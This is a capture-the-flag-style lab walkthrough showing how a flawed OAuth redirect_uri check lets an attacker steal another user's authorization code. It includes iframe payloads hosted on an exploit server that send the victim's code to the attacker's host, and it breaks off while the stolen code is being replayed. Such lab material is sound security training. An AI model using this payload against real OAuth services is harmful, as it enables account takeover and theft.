Title: OAuth account hijacking via redirect_uri
Level: PRACTITIONER
Desc:  This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.
To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.
The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
You can log in with your own social media account using the following credentials: wiener:peter. 

# Walkthrough:
Authorization request using OAuth 2 looks like this in our scenario:
<img width="1276" height="395" alt="image" src="https://github.com/user-attachments/assets/e7d81356-4377-40e7-8916-2b2c12c612a5" />

After requesting `auth?client_id=droxfqd5fgdvrzu76m57k&redirect_uri=https://0afd00aa03225e9980e003f7008800c9.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email` I instantly get redirection to:
`https://0afd00aa03225e9980e003f7008800c9.web-security-academy.net/oauth-callback?code=_UTscUfogrYUTH1AGzaos1W98A8GvMeuion6dDDrETm`.

I can see my code.

Notice, that you can change redirect_uri to any and it is reflected in response with code.

<img width="1252" height="396" alt="image" src="https://github.com/user-attachments/assets/d8388460-699c-4c1b-afaf-e029134c4b3b" />

On the exploit server I make:
`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`

`<iframe src="https://oauth-0acb0075031b5e3b807a01f60218005f.oauth-server.net/auth?client_id=droxfqd5fgdvrzu76m57k&redirect_uri=https://exploit-0abe00cf03805ed68065021b01a600eb.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`

Sending this to victim and we have their code:
<img width="1084" height="360" alt="image" src="https://github.com/user-attachments/assets/08aaec59-1b1a-40af-9b2c-0e673176c79a" />

`/?code=KYzvzmxIWsZeqRm2YZcObNYugHBjDBfNJ-BzJ1mXQEJ`

Now we need to use this code in authentication request.

This request being edited.
<img width="905" height="326" alt="image" src="https://github.com/user-attachments/assets/9e298728-c901-4b6e-8ebc-beef4aebf5f7" />


